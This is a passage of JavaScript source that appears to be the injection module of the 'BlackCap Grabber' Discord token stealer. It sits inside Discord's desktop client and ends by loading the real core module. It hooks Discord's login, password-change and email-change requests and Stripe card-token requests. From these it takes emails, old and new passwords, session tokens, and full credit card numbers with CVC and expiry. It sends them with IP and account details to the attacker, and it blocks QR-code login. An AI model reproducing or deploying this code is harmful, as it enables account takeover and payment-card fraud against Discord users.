                        inline: !1
												}, ],

                    "footer": {
                        "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}, {
                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(),

                    "footer": {
                        "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                    },
                    "image": {
                        'url': `${bannerurl}`,
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}]
            }
            
            hooker(params)
        })
    })
}

async function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
        window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
            function totalFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                return r.length
            }

            function CalcFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                var gay = "";
                for (z of r) {
                    var b = GetRBadges(z.user.public_flags)
                    if (b != "") {
                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                    }
                }
                if (gay == "") {
                    gay = "No Rare Friends"
                }
                return gay
            }

            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return ":x:"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += ":heavy_check_mark:" + " :credit_card:"
                    } else {
                        return ":x:"
                    }
                })
                if (billing == "") {
                    billing = ":x:"
                }
                return billing
            }
            if(info.avatar === null){
                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
            if(info.banner === null){
                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;


            
           const params = {
                username: "BlackCap Grabber",
                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                content: "",
                embeds: [{
                        "title": "BlackCap Detect Email Changed",
                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                inline: !1
					}, {
                                name: "Username <:username:1041634536733290596>",
                                value: `\`${info.username}#${info.discriminator}\``,
                                inline: !0
					}, {
                                name: "ID <:iduser:1041634535395307520>",
                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                                inline: !0
					}, {
                                name: "Nitro <a:nitro:1041639670288748634>",
                                value: `${GetNitro(info.premium_type)}`,
                                inline: !0
					}, {
                                name: "Badges <:badge:1041634538150973460>",
                                value: `${GetBadges(info.flags)}`,
                                inline: !0
					}, {
                                name: "Language <:language:1041640473477001236>",
                                value: `${GetLangue(info.locale)}`,
                                inline: !0
					}, {
                                name: "NSFW <a:nsfw:1041640474617839616>",
                                value: `${GetNSFW(info.nsfw_allowed)}`,
                                inline: !1
					}, {
                                name: "A2F <a:a2f:1040272766982692885>",
                                value: `${GetA2F(info.mfa_enabled)}`,
                                inline: !0
					}, {
                                name: "@Copyright",
                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                inline: !0
					}, {
                                name: "Billing <a:billing:1041641103629234196>",
                                value: `${Cool()}`,
                                inline: !1
					}, {
                                name: "New Email <a:email:1041639672037785691>",
                                value: `\`${newemail}\``,
                                inline: !0
					}, {
                                name: "<a:password:1041639669047238676> Password",
                                value: `\`${password}\``,
                                inline: !0
					}, {
                                name: "<a:tokens:1041634540537511957> Token",
                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                inline: !1
					},
				],

                        "footer": {
                            "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                        },
                        "thumbnail": {
                            "url": `${usericonurl}`
                        }
				}, {
                        "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                        "color": config['embed-color'],
                        "description": CalcFriends(),

                        "footer": {
                            "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                        },
                        "image": {
                            'url': `${bannerurl}`,
                        },

                        "thumbnail": {
                            "url": `${usericonurl}`
                        }
			}
		]
            }
            hooker(params)
        })
    })
}




async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
        if(info.avatar === null){
            usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
        }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
        if(info.banner === null){
            bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
        }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;

        
        const params = {
            username: "BlackCap Grabber",
            avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
            content: "",
            embeds: [{
                    "title": "BlackCap User Credit Card Added",
                    "description": `
                    **IP:** ${ip}\n\n
                    **Username** <:username:1041634536733290596>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
                    **ID** <:iduser:1041634535395307520>\n\`\`\`${info.id}\`\`\`\n
                    **Email** <a:email:1041639672037785691>\n\`\`\`${info.email}\`\`\`\n
                    **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(info.premium_type)}\n
					**Language** <:language:1041640473477001236>\n${GetLangue(info.locale)}\n
					**A2F** <a:a2f:1040272766982692885>\n${GetA2F(info.mfa_enabled)}\n
					**NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(info.nsfw_allowed)}\n
                    **Badges** <:badge:1041634538150973460>\n${GetBadges(info.flags)}\n
                    **Credit Card Number**\n\`\`\`${number}\`\`\`\n
                    **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
                    **CVC**\n\`\`\`${cvc}\`\`\`\n
                    <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
                    "author": {
                        "name": "BlackCap"
                    },
                    "footer": {
                        "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
                    },
            },
                {
                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,

                    "footer": {
                        "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                    },
                    "image": {
                        'url': `${bannerurl}`,
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
            }
        ]
        }
        let data = JSON.stringify(params);
        let UwU = JSON.stringify({ data: data, token: token })
        hooker(params)
}

const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};




session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
        cancel: true
    });
    updateCheck();

    if (FirstTime()) {}

    callback({})
    return;
})


session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                Login(email, password, token)
            }))
        } else {}
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        } else {}
    }
    if (details.url.endsWith("tokens")) {
        const window = BrowserWindow.getAllWindows()[0];
        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        })).catch(console.error);
    }
});





module.exports = require('./core.asar')
